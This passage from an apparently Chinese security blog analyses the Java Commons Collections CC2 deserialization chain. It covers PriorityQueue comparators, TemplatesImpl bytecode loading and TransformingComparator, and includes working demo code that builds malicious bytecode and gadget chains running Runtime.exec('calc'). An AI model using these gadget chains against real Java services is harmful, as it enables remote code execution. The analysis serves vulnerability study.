<li>PriorityQueue<Integer> queue&#x3D;new PriorityQueue&lt;&gt;(); &#x2F;&#x2F;默认优先级队列，规则从小到大</Integer></li>
<li>PriorityQueue<Integer> queue&#x3D;new PriorityQueue&lt;&gt;( (a,b)-&gt;(b-a)); &#x2F;&#x2F;设置比较器，从大到小排列</Integer></li>
</ul>
<p>实现方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//默认优先级队列</span></span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//设置了比较规则的优先级队列</span></span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq2=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;( (a,b)-&gt;(b-a));</span><br><span class="line"></span><br><span class="line">        pq.add(<span class="number">3</span>);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">        pq.add(<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//默认优先级队列输出，默认从小到大</span></span><br><span class="line">        System.out.print(<span class="string">&quot;默认优先级队列输出:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.print(pq.poll());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        pq2.add(<span class="number">3</span>);</span><br><span class="line">        pq2.add(<span class="number">1</span>);</span><br><span class="line">        pq2.add(<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//默认优先级队列输出</span></span><br><span class="line">        System.out.print(<span class="string">&quot;设置比较器优先级队列输出:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.print(pq2.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/7e30cd4a/cc2-13.png" title="优先级队列"></p>
<p>自定义使用方法：</p>
<ul>
<li>类实现了Comparable接口，定义了比较方法，直接使用即可PriorityQueue&lt;类名&gt; queue&#x3D;new PriorityQueue&lt;&gt;();</li>
<li>当传递对象元素未实现Comparable接口，可自定义新Comparable<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue&lt;People&gt; pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;People&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(People o1, People o2)</span> &#123;</span><br><span class="line">                <span class="comment">////判断数值从大到小，如果第一个元素数值比第二个大，返回1标识顺序正确，否则返回-1</span></span><br><span class="line">                <span class="keyword">return</span> o1.getAge()-o2.getAge()&gt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>其中进行判断的比较器参数o1,o2，其中o1表示新插入的元素，o2表示被比较的元素也就是插入的前面一个元素。其中最后return 1表示当前比较的两个元素顺序正确，-1表示顺序不正确，不正确后将新插入的元素进行上沉操作（也就是向前排），然后循环比较上沉后的前面一个元素，继续判断直到顺序正确。</p>
<p><img src="/posts/7e30cd4a/cc2-14.png" title="参数描述"></p>
<p>简单实现效果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PriorityQueue&lt;People&gt; pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;People&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(People o1, People o2)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> o1.getAge()-o2.getAge()&gt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>; <span class="comment">//判断数值从大到小，如果第一个元素数值比第二个大，返回1标识顺序正确，否则返回-1</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;默认添加顺序:&quot;</span>);</span><br><span class="line">        People people1=<span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;小痴&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        People people2=<span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;小笨&quot;</span>,<span class="number">26</span>);</span><br><span class="line">        People people3=<span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;小臭&quot;</span>,<span class="number">25</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;经过比较器后的顺序:&quot;</span>);</span><br><span class="line">        pq.add(people1);</span><br><span class="line">        pq.add(people2);</span><br><span class="line">        pq.add(people3);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.println(pq.poll().show());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/7e30cd4a/cc2-15.png" title="实现"></p>
<h2 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h2><p>ClassLoader为类加载器，可以将字节码文件(.class文件)，通过loadClass函数加载类名，返回一个Class对象，同时ClassLoader类下面存在defineClass方法，可以将byte[]字节数组信息还原成一个Class对象，在学javassist中，了解到javassist可以动态生成字节码文件，包括了一些恶意代码文件，可进而通过ClassLoader类加载器将这些恶意的字节码文件转化为java类进行调用，达到执行恶意代码的目的</p>
<p>其中类加载阶段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader#loadClass（类加载，从类缓或父加载器等位置寻找类）</span><br><span class="line">    ——&gt; ClassLoader#findClass（寻找类，通过URL制定的方式加载字节码）</span><br><span class="line">        ——&gt; ClassLoader#defineClass（定义类，通过获取的字节码转换成类对象）</span><br></pre></td></tr></table></figure>

<p>由于ClassLoader#defineClass方法为protect修饰，因此可通过反射进行调用</p>
<p>简单实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//ct.writeFile(&quot;./&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bt=ct.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射调用ClassLoader#defineClass</span></span><br><span class="line">        Method define=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class ,<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        define.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class cla=(Class)define.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;People2&quot;</span>,bt,<span class="number">0</span>,bt.length);</span><br><span class="line">        cla.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/7e30cd4a/cc2-25.png" title="defineClass实现"></p>
<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>TemplatesImpl这个类简述功能就是对xsl格式文件生成的字节码转换成XSLTC模板对象，期间会处理字节码，因此重写了defineClass方法，具体描述可查看<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/247044">TemplatesImpl了解</a></p>
<p><img src="/posts/7e30cd4a/cc2-26.png" title="重写defineClass"></p>
<p>重写了<code>defineClass</code>方法，并且没有定义域，可以在其他类进行调用使用，而<code>ClassLoader#defineClass</code>定义域是受保护的，在很多情况中调用受限，因此这也是<code>TransletClassLoader#defineClass</code>作为很多序列化漏洞入口，而不是使用<code>ClassLoader#defineClass</code></p>
<p>但该<code>defineClass()</code>的调用并不会实例化，需要通过<code>newInstance()</code>进行实例化。</p>
<p>依次看调用情况</p>
<h3 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses()"></a>defineTransletClasses()</h3><p><code>defineClass</code>在<code>defineTransletClasses</code>方法中被调用</p>
<p><img src="/posts/7e30cd4a/cc2-27.png" title="defineClass调用"></p>
<p>其中需要的满足条件：</p>
<ol>
<li><p><code>_bytecodes</code>不能为空，为空会直接抛出异常</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>_tfactory</code>需要实例化<br>创建的<code>TransletClassLoader</code>(Translet类的加载器)对象，其中<code>_tfactory.getExternalExtensionsMap()</code>中的<code>_tfactory</code>对象为<code>TransformerFactoryImpl</code>类对象，等同于调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法，但其中<code>_tfactory</code>对象初始赋值为null，直接执行会报错，因此需要将<code>_tfactory</code>进行实例化，才能调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">           AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">               <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br></pre></td></tr></table></figure>
<p>两种实现方法都可以实例化，第一种通过<code>TransformerFactoryImpl()</code>构造方法实现实例化对象，第二种通过反射直接实现实例化对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>父类需要为ABSTRACT_TRANSLET</code>类<br>通过for循环对字节文件类进行循环定义并赋值给class数组，其中会判断当前获取的字节类的父类是否为<code>ABSTRACT_TRANSLET</code>类，是的话会讲该类序号赋值给<code>_transletIndex</code>，否则不是的话会抛出异常（表意为只有存在父类为<code>ABSTRACT_TRANSLET</code>类的<code>translet</code>类才能被实例化），从而在<code>getTransletInstance</code>类中的<code>AbstractTranslet</code>实例化步骤将父类为<code>ABSTRACT_TRANSLET</code>的类进行实例化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">               _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">               <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">               <span class="comment">// Check if this is the main class</span></span><br><span class="line">               <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                   _transletIndex = i;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>_bytecodes</code>字节码需要设置为byte[][]数组，<code>_bytecodes</code>变量声明为byte[][]类型，如果直接通过javassist toBytecode()生成byte[]数组运行会报错。<br><img src="/posts/7e30cd4a/cc2-33.png" title="_bytecodes数组"><br><img src="/posts/7e30cd4a/cc2-34.png" title="_bytecodes数组"><br>因此需要将一维数组转化为二维数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>接着查看<code>defineTransletClasses</code>方法的上层调用情况<br>其中有三处对该方法进行了调用，其中只用<code>getTransletInstance</code>方法有上层调用，其他两个方法没有被其他方法进行调用。</p>
<p><img src="/posts/7e30cd4a/cc2-28.png" title="getTransletInstance调用"></p>
<h3 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h3><p><img src="/posts/7e30cd4a/cc2-29.png" title="getTransletInstance调用"></p>
<p>其中需要的满足条件：</p>
<ol>
<li><p><code>_name</code>不能为空，为空会直接返回<code>null</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>_class</code>必须为空，才能调用<code>defineTransletClasses</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br></pre></td></tr></table></figure></li>
</ol>
<p>最后通过创建<code>AbstractTranslet</code>对象将class文件类进行实例化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure>

<p>接着查看<code>getTransletInstance</code>方法的上层调用情况</p>
<p><img src="/posts/7e30cd4a/cc2-30.png" title="getTransletInstance调用"></p>
<p><code>newTransformer()</code>方法进行了调用</p>
<h3 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h3><p>在调用构造函数的时候调用了<code>getTransletInstance</code>方法，返回Translet类的实例，其中没有需要的满足条件。</p>
<p>接着查看<code>newTransformer()</code>方法的上层调用情况</p>
<p><img src="/posts/7e30cd4a/cc2-31.png" title="newTransformer调用"></p>
<p>其中有5处显示进行了调用，但只有<code>getOutputProperties</code>方法调用的本类的<code>newTransformer()</code>方法，其他四种都是调用的其他类重写的<code>newTransformer()</code>方法。</p>
<h3 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties()"></a>getOutputProperties()</h3><p><img src="/posts/7e30cd4a/cc2-32.png" title="getOutputProperties调用"></p>
<p>该方法直接执行了<code>newTransforme</code>方法，没有其他条件限制，查询<code>getOutputProperties</code>的上层调用，没有在本类发现其调用，因此最后的执行方法就在<code>getOutputProperties</code></p>
<h3 id="完整链"><a href="#完整链" class="headerlink" title="完整链"></a>完整链</h3><p>到<code>newTransformer</code>方法执行就能达到触发了，他上层<code>getOutputProperties</code>方法也进行了调用，也可以算进去当作延伸出来的链。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getOutputProperties()</span><br><span class="line">    newTransformer()</span><br><span class="line">        getTransletInstance()</span><br><span class="line">            defineTransletClasses()</span><br><span class="line">                defineClass()</span><br></pre></td></tr></table></figure>

<h3 id="实现demo"><a href="#实现demo" class="headerlink" title="实现demo"></a>实现demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化，效果等同于new TransformerFactoryImpl()</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">        <span class="comment">//执行newTransformer()方法</span></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">        <span class="comment">//执行getOutputProperties(),getOutputProperties为newTransformer上层调用，执行效果相同，就是多了个执行步骤</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/7e30cd4a/cc2-35.png" title="实现demo"></p>
<p>其中的空指针的报错原因是在赋值传递变量时没有指向对象，然后在调用时直接通过该变量去调用对应的方法导致报错，但不影响执行效果。</p>
<h1 id="0x04、CC2利用链分析"><a href="#0x04、CC2利用链分析" class="headerlink" title="0x04、CC2利用链分析"></a>0x04、CC2利用链分析</h1><h2 id="逆推调用链"><a href="#逆推调用链" class="headerlink" title="逆推调用链"></a>逆推调用链</h2><p>分析CC1链的时候知道目的是调用<code>InvokerTransformer.transform()</code>方法，CC2链的后半段利用链跟CC1链相同，那就从不同的地方接着分析。<br>在搜寻<code>InvokerTransformer.transform()</code>方法的时候，CC2链中<code>TransformingComparator.compare()</code>方法对其进行了调用。<br><img src="/posts/7e30cd4a/cc2-5.png" title="TransformingComparator.compare()"></p>
<p>但该方法在cc1链中也调用了为啥不行，因为在<code>Commons Collections4</code>版本中<code>TransformingComparator</code>类实现了序列化接口，而CC1链中依赖<code>Commons Collections3</code>版本，3版本中<code>TransformingComparator</code>类未实现序列化接口，因此入口不成立。</p>
<p><code>Commons Collections4</code>版本中<code>TransformingComparator</code>类实现了序列化接口。</p>
<p><img src="/posts/7e30cd4a/cc2-6.png" title="实现了序列化接口"></p>
<p>其中由构造函数传入<code>transformer</code>对象可控</p>
<p><img src="/posts/7e30cd4a/cc2-7.png" title="构造函数传入"></p>
<p>简单实现demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//调用TransformingComparator执行compare方法。</span></span><br><span class="line">        TransformingComparator cp=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//随便传入2个参数比较，只为调用.transform()方法</span></span><br><span class="line">        cp.compare(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/7e30cd4a/cc2-8.png" title="实现demo"></p>
<p>接下来看在哪调用了<code>compare()</code>方法<br>有很多类都进行了调用，其中cc2链中的调用为<code>PriorityQueue</code>类</p>
<p><img src="/posts/7e30cd4a/cc2-9.png" title="调用情况"></p>
<p><code>PriorityQueue</code>类中<code>siftUpUsingComparator</code>、<code>siftDownUsingComparator</code>两个方法都进行了调用，再分别查看这两个方法在哪进行了调用。</p>
<p><strong>siftUpUsingComparator：</strong><br>先是在同类的<code>siftUp</code>方法中进行了调用</p>
<p><img src="/posts/7e30cd4a/cc2-10.png" title="siftUp"></p>
<p><code>offer</code>、<code>removeAt</code>这两个方法调用了</p>
<p><img src="/posts/7e30cd4a/cc2-11.png" title="siftUp"></p>
<p>追溯调用<code>offer</code>、<code>removeAt</code>者两个方法，发现这两个方法被调用的情况有很多，直观上也没有找到对应的入口，就先看另外一个方法</p>
<p><img src="/posts/7e30cd4a/cc2-12.png" title="removeAt"></p>
<p><strong>siftDownUsingComparator：</strong><br><code>siftDownUsingComparator</code>方法在<code>siftDown</code>方法中被调用</p>
<p><img src="/posts/7e30cd4a/cc2-16.png" title="siftDown"></p>
<p>继续向上，<code>siftDown</code>方法有三个方法进行了调用，其中<code>heapify</code>方法在反序列化<code>readObject</code>方法中调用</p>
<p><img src="/posts/7e30cd4a/cc2-17.png" title="siftDown"><br><img src="/posts/7e30cd4a/cc2-18.png" title="heapify"></p>
<h2 id="正向分析调用链"><a href="#正向分析调用链" class="headerlink" title="正向分析调用链"></a>正向分析调用链</h2><p>找到了反序列化入口，开始分析下调用情况</p>
<p><img src="/posts/7e30cd4a/cc2-19.png" title="readObject"></p>
<p>通过注释也不难明白，通过for循环读取序列化数据存在队列中，最后进行堆排序<code>heapify()</code><br>堆排列中通过循环数组长度（size），获取每个元素并执行<code>siftDown</code>方法，其中的长度验证可以调试查看是否为数组长度</p>
<p><img src="/posts/7e30cd4a/cc2-20.png" title="size验证"><br><img src="/posts/7e30cd4a/cc2-21.png" title="size验证"></p>
<p>为数组长度接下来进行堆排序<code>heapify()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中来理解<code>size &gt;&gt;&gt; 1</code>, <code>&gt;&gt;&gt;</code>为无符号右移，将size的值转换成二进制并将二进制数值整体向右移动<code>&gt;&gt;&gt;</code>后面数字的位数<br>比如这里size为3，二进制为<font color="red">0000…0000 0011</font> (整数类型有32位的长度，为了方便省略中间重复的0)，<code>&gt;&gt;&gt; 1</code>无符号右移1位<br>对应的二进制为<font color="red">0000…0000 0001</font>，即10进制为1。此时size大小为1。</p>
<p>所以当size小于2时，for循环中i的值就为<code>0-1=-1</code>，直接跳出循环，不会执行<code>siftDown</code>方法，设计意义也是为了有2个及以上的队列元素才进行排序操作。<br>因此满足此条件，必须给queue队列添加2个及以上元素，才能执行<code>siftDown</code>方法。</p>
<p>接下来到<code>siftDown</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>首先会判断是否存在<code>comparator</code>比较器，比较器存在就调用<code>siftDownUsingComparator</code>方法，不存在比较器就调用<code>siftDownComparable</code>方法，按逆推调用链的话就必须存在比较器，才能去调用<code>siftDownUsingComparator</code>方法<br>最后在<code>siftDownUsingComparator</code>方法中调用比较器的<code>compare</code>方法</p>
<p><img src="/posts/7e30cd4a/cc2-22.png" title="compare方法"></p>
<p>其中针对<code>PriorityQueue</code>类中的各个方法源码含义<br>可查看相关方法注解：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/freeorange/p/11405227.html">https://www.cnblogs.com/freeorange/p/11405227.html</a></p>
<h2 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h2><p>在cc1后半段基础上补充cc2的利用链，就形成完整利用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  -PriorityQueue.readObject()</span><br><span class="line">    -PriorityQueue.heapify()</span><br><span class="line">      -PriorityQueue.siftDown()</span><br><span class="line">        -PriorityQueue.siftDownUsingComparator()</span><br><span class="line">          -TransformingComparator.compare()</span><br><span class="line">            -ChainedTransformer.transform()</span><br><span class="line">              -ConstantTransformer.transform()</span><br><span class="line">              -InvokerTransformer.transform()</span><br><span class="line">                -Method.invoke()</span><br><span class="line">                  -Class.getMethod()</span><br><span class="line">              -InvokerTransformer.transform()</span><br><span class="line">                -Method.invoke()</span><br><span class="line">                  -Runtime.getRuntime()</span><br><span class="line">              